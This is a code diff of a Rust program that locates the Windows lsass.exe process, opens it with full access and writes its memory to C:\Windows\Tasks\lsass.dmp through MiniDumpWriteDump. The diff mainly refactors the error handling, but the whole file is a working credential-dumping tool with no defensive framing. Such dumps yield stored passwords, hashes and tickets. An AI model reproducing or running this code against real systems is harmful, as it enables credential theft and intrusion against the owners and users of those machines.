@@ -1,4 +1,4 @@
-use std::{ffi::CString, process::exit, ptr::null_mut};
+use std::{ffi::CString, ptr::null_mut};
 use sysinfo::{PidExt, ProcessExt, System, SystemExt};
 use windows::core::PCSTR;
 use windows::Win32::Foundation::{CloseHandle, HANDLE};
@@ -15,7 +15,7 @@ use windows::Win32::System::{
     }
 };
 
-fn find_lsass() -> Result<u32, String> {
+fn find_lsass() -> Result<u32, &'static str> {
     let mut system = System::new_all();
     system.refresh_all();
 
@@ -31,21 +31,14 @@ fn find_lsass() -> Result<u32, String> {
         return Ok(process.pid().as_u32());
     }
 
-    return Err(String::from("Error finding lsass PID!"));
+    return Err("Error finding lsass PID!");
 }
 
-fn main() {
+fn main() -> Result<(), Box<dyn std::error::Error>>{
     unsafe {
-        let pid_lsass = find_lsass().unwrap_or_else(|e| {
-            panic!("[!] find_lsass Failed With Error: {e}");
-        });
-
-        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, pid_lsass).unwrap_or_else(|e| {
-            panic!("[!] OpenProcess Failed With Error: {e}");
-        });
-
+        let pid_lsass = find_lsass()?;
+        let hprocess = OpenProcess(PROCESS_ALL_ACCESS, false, pid_lsass)?;
         let path = CString::new("C:\\Windows\\Tasks\\lsass.dmp").expect("CString::new failed");
-
         let hfile = CreateFileA(
             PCSTR(path.as_ptr() as *const u8),
             FILE_GENERIC_WRITE.0,
@@ -54,9 +47,7 @@ fn main() {
             CREATE_ALWAYS,
             FILE_ATTRIBUTE_NORMAL,
             HANDLE(0),
-        ).unwrap_or_else(|e| {
-            panic!("[!] CreateFileA Failed With Error: {e}");
-        });
+        )?;
 
         println!("[+] HANDLE lsass.exe: {:?}", hprocess);
         println!("[+] PID: {:?}", pid_lsass);
@@ -69,13 +60,13 @@ fn main() {
             None,
             None,
             None,
-        ).unwrap_or_else(|e| {
-            panic!("[!] MiniDumpWriteDump Failed With Error: {e}");
-        });
+        )?;
 
         println!("[+] lsass dump successful!");
 
-        CloseHandle(hprocess);
-        CloseHandle(hfile);
+        CloseHandle(hprocess)?;
+        CloseHandle(hfile)?;
     }
+
+    Ok(())
 }
